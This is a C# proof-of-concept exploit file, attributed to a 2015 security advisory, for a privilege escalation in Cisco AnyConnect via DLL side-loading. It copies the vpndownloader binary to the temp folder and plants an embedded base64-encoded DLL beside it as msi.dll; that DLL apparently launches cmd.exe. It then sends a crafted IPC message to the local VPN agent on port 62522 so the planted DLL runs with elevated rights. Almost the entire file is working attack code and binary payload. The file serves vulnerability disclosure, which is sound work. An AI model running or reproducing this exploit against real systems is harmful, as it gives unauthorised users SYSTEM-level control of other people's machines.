﻿/*	Cisco AnyConnect elevation of privileges via DLL side-loading - proof of concept
	Yorick Koster, June 2015
	https://securify.nl/advisory/SFY20150601/cisco_anyconnect_elevation_of_privileges_via_dll_side_loading.html
	based on http://expertmiami.blogspot.com/2015/06/cisco-anyconnect-secure-mobility-client.html
*/
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Microsoft.Win32;
using System.Threading;

namespace AnyConnectEoP
{
	 class AnyConnectEoP
	 {
		  static void Main(string[] args)
		  {
				try
				{
					 byte[] bytes = new byte[1024];
					 byte[] msg = new byte[0];
					 int offset = 0;
					 int length = 0;
					 String vpndownloader = ((String)Registry.GetValue(
						@"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\vpnagent", "ImagePath", 
						@"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\" +
						"vpnagent.exe")).Replace("\"", "").Replace("vpnagent", "vpndownloader");
					 String path = Path.GetTempPath() + @"vpndownloader.exe";
					 String desktop = @"WinSta0\Default";

					 FileStream theDll = File.Create(Path.GetTempPath() + @"msi.dll");
					 theDll.Write(MSI_DLL, 0, MSI_DLL.Length);
					 theDll.Close();
					 File.Copy(vpndownloader, path, true);

					 length = 10 + path.Length + desktop.Length;
					 msg = new byte[length + 26];
					 msg[0] = 0x4f;
					 msg[1] = 0x43;
					 msg[2] = 0x53;
					 msg[3] = 0x43;
					 msg[4] = 0x1a;
					 msg[5] = 0x00;
					 msg[6] = (byte)(length & 0xFF);
					 msg[7] = (byte)((length >> 8) & 0xFF);
					 offset = 8;
					 Buffer.BlockCopy(Guid.NewGuid().ToByteArray(), 0, msg, offset, 16);
					 offset += 16;
					 msg[offset] = 0x01;
					 msg[offset + 1] = 0x02;
					 msg[offset + 2] = 0x00;
					 msg[offset + 3] = 0x01;
					 msg[offset + 4] = 0x00;
					 msg[offset + 5] = (byte)((path.Length & 0xFF) + 1);
					 offset += 6;
					 Buffer.BlockCopy(Encoding.ASCII.GetBytes(path), 0, msg, offset, path.Length);
					 offset += path.Length;
					 msg[offset] = 0x00;
					 msg[offset + 1] = 0x00;
					 msg[offset + 2] = 0x04;
					 msg[offset + 3] = 0x00;
					 msg[offset + 4] = (byte)((desktop.Length & 0xFF) + 1);
					 offset += 5;
					 Buffer.BlockCopy(Encoding.ASCII.GetBytes(desktop), 0, msg, offset, desktop.Length);
					 offset += desktop.Length;
					 msg[offset] = 0x00;

					 IPEndPoint localhost = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 62522);
					 Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream,
						ProtocolType.Tcp);
					 sender.Connect(localhost);
					 int bytesSent = sender.Send(msg);
					 int bytesRec = sender.Receive(bytes);
					 sender.Shutdown(SocketShutdown.Both);
					 sender.Close();

					 Thread.Sleep(5000);
					 File.Delete(path);
					 File.Delete(Path.GetTempPath() + @"msi.dll");
				}
				catch(Exception e)
				{
					 Console.WriteLine(e.ToString());
					 Console.WriteLine("Press any key...");
					 Console.ReadKey();
				}
		  }

		  private static byte[] MSI_DLL = Convert.FromBase64String(
			"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" +
			"ABAxRfwzxVCJZej/dfiLRfzHRfz+////iUX4jUXwZKMAAAAAw4tN8GSJDQAAAABZ" +
			"X19eW4vlXVHDVYvs/3UU/3UQ/3UM/3UIaH0QABBoADAAEOgvAAAAg8QYXcP/JUgg" +
			"ABD/JTQgABD/JSggABD/JSwgABD/JTAgABD/JTggABD/JUAgABD/JUQgABD/JRAg" +
			"ABD/JWggABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIIwAAxCQAAK4kAACUJAAA" +
			"eCQAAGQkAABUJAAARCQAANokAAAAAAAAqCMAAM4jAADWIwAAjiMAAO4jAAD8IwAA" +
			"BiQAACokAAB4IwAAaiMAAF4jAABQIwAASCMAADojAAAoIwAA4CMAAPQkAAAAAAAA" +
			"AAAAAAAAAAAAAAAAjBAAELEWABAAAAAAAAAAAAAAAAAAAAAA8CCNVQAAAAACAAAA" +
			"bgAAAFghAABYDwAAAAAAAPAgjVUAAAAADAAAABQAAADIIQAAyA8AAAAAAAAgMAAQ" +
			"cDAAEEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABjAG0A" +
			"ZAAuAGUAeABlAAAAAAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABDgIQAQAQAAAFJTRFP2OW3x" +
			"wkdMS5Eml+NNIIV6AQAAAEM6XFVzZXJzXFlvcmlja1xEb2N1bWVudHNcVmlzdWFs" +
			"IFN0dWRpbyAyMDEzXFByb2plY3RzXERsbEluamVjdFxSZWxlYXNlXERsbEluamVj" +
			"dC5wZGIAAAAAAAAADgAAAA4AAAABAAAAAAAAAAAAAAD5GAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAD+////AAAAAND///8AAAAA/v///wAAAAAXFAAQAAAAAOITABD2EwAQ" +
			"/v///wAAAADY////AAAAAP7///9JFgAQXBYAEAAAAAD+////AAAAAMz///8AAAAA" +
			"/v///wAAAACKFwAQmCIAAAAAAAAAAAAAGiMAAAAgAADAIgAAAAAAAAAAAADAIwAA" +
			"KCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCMAAMQkAACuJAAAlCQAAHgkAABkJAAA" +
			"VCQAAEQkAADaJAAAAAAAAKgjAADOIwAA1iMAAI4jAADuIwAA/CMAAAYkAAAqJAAA" +
			"eCMAAGojAABeIwAAUCMAAEgjAAA6IwAAKCMAAOAjAAD0JAAAAAAAANsAQ3JlYXRl" +
			"UHJvY2Vzc1cAAEtFUk5FTDMyLmRsbAAAbwFfX0NwcFhjcHRGaWx0ZXIAFwJfYW1z" +
			"Z19leGl0AACDBmZyZWUAAKUDX21hbGxvY19jcnQADANfaW5pdHRlcm0ADQNfaW5p" +
			"dHRlcm1fZQBQAl9jcnRfZGVidWdnZXJfaG9vawAArAFfX2NydFVuaGFuZGxlZEV4" +
			"Y2VwdGlvbgCrAV9fY3J0VGVybWluYXRlUHJvY2VzcwBNU1ZDUjEyMC5kbGwAAJQD" +
			"X2xvY2sABAVfdW5sb2NrAC4CX2NhbGxvY19jcnQArgFfX2RsbG9uZXhpdAA6BF9v" +
			"bmV4aXQAjAFfX2NsZWFuX3R5cGVfaW5mb19uYW1lc19pbnRlcm5hbAAAegJfZXhj" +
			"ZXB0X2hhbmRsZXI0X2NvbW1vbgAhAUVuY29kZVBvaW50ZXIA/gBEZWNvZGVQb2lu" +
			"dGVyAGcDSXNEZWJ1Z2dlclByZXNlbnQAbQNJc1Byb2Nlc3NvckZlYXR1cmVQcmVz" +
			"ZW50AC0EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIACgJHZXRDdXJyZW50UHJvY2Vz" +
			"c0lkAA4CR2V0Q3VycmVudFRocmVhZElkAADWAkdldFN5c3RlbVRpbWVBc0ZpbGVU" +
			"aW1lAOoGbWVtc2V0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABO5kC7sRm/RAAAAAAAAAAA" +
			"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAA" +
			"AAAAAAAAAQACAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAJBAAASAAAAGBAAAB9AQAA" +
			"AAAAAAAAAAAAAAAAAAAAADw/eG1sIHZlcnNpb249JzEuMCcgZW5jb2Rpbmc9J1VU" +
			"Ri04JyBzdGFuZGFsb25lPSd5ZXMnPz4NCjxhc3NlbWJseSB4bWxucz0ndXJuOnNj" +
			"aGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEnIG1hbmlmZXN0VmVyc2lvbj0nMS4w" +
			"Jz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNv" +
			"bTphc20udjMiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2" +
			"aWxlZ2VzPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9" +
			"J2FzSW52b2tlcicgdWlBY2Nlc3M9J2ZhbHNlJyAvPg0KICAgICAgPC9yZXF1ZXN0" +
			"ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0K" +
			"PC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"ABAAAAwBAAAHMEswUTB/MJQwnjCjMKgwvjDKMOsw+TD+MC0xQzFJMVwxYjF8MYgx" +
			"kTGbMaExqTHZMeEx5jHrMfAx9jEoMkgyWzJgMmYyejJ/MosymjKiMrkyvzL1MhAz" +
			"HTMxM5szzTMcNCo0MTRENHw0gjSINI40lDSaNKE0qDSvNLY0vTTENMs00zTbNOM0" +
			"7zT4NP00AzUNNRc1JzU3NUc1UDVgNWY1xjXLNd01+zUPNhU2szbENs821DbZNvA2" +
			"/zYFNxg3LTc4N043aDdyN7o31TfhN/A3+TcGODU4PThKOE84ajhvOIo4kDiVOKE4" +
			"vjgJOQ45HjkkOSo5MDk2OTw5QjlIOU45VDkAAAAgAAAgAAAAfDCAMMww0DBMMVAx" +
			"EDIYMhwyNDI4MlgyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=");
	 }
}